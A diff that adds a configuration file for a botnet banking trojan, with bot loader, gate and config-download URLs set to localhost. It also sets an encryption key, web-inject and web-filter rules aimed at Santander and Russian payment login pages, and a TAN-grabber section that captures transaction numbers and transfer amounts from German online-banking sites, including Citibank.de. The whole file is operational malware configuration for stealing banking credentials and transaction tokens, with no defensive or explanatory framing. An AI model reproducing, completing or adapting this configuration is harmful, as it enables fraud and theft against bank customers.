@@ -1,0 +1,45 @@
+;Build time:   14:15:23 10.04.2009 GMT
+;Version:      1.2.4.2
+
+entry "StaticConfig"
+  ;botnet "btn1"
+  timer_config 60 1
+  timer_logs 1 1
+  timer_stats 20 1
+  url_config "http://localhost/config.bin"
+  url_compip "http://localhost/ip.php" 1024
+  encryption_key "secret key"
+  ;blacklist_languages 1049
+end
+
+entry "DynamicConfig"
+  url_loader "http://localhost/bot.exe"
+  url_server "http://localhost/gate.php"
+  file_webinjects "webinjects.txt"
+  entry "AdvancedConfigs"
+    ;"http://advdomain/cfg1.bin"
+  end
+  entry "WebFilters"
+    "!*.microsoft.com/*"
+    "!http://*myspace.com*"
+    "https://www.gruposantander.es/*"
+    "!http://*odnoklassniki.ru/*"
+    "!http://vkontakte.ru/*"
+    "@*/login.osmp.ru/*"
+    "@*/atl.osmp.ru/*"
+  end
+  entry "WebDataFilters"
+    ;"http://mail.rambler.ru/*" "passw;login"
+  end
+  entry "WebFakes"
+    ;"http://www.google.com" "http://www.yahoo.com" "GP" "" ""
+  end
+  entry "TANGrabber"
+    "https://banking.*.de/cgi/ueberweisung.cgi/*" "S3R1C6G" "*&tid=*" "*&betrag=*"
+    "https://internetbanking.gad.de/banking/*" "S3C6" "*" "*" "KktNrTanEnz"
+    "https://www.citibank.de/*/jba/mp#/SubmitRecap.do" "S3C6R2" "SYNC_TOKEN=*" "*"
+  end
+  entry "DnsMap"
+    ;127.0.0.1 microsoft.com
+  end
+end
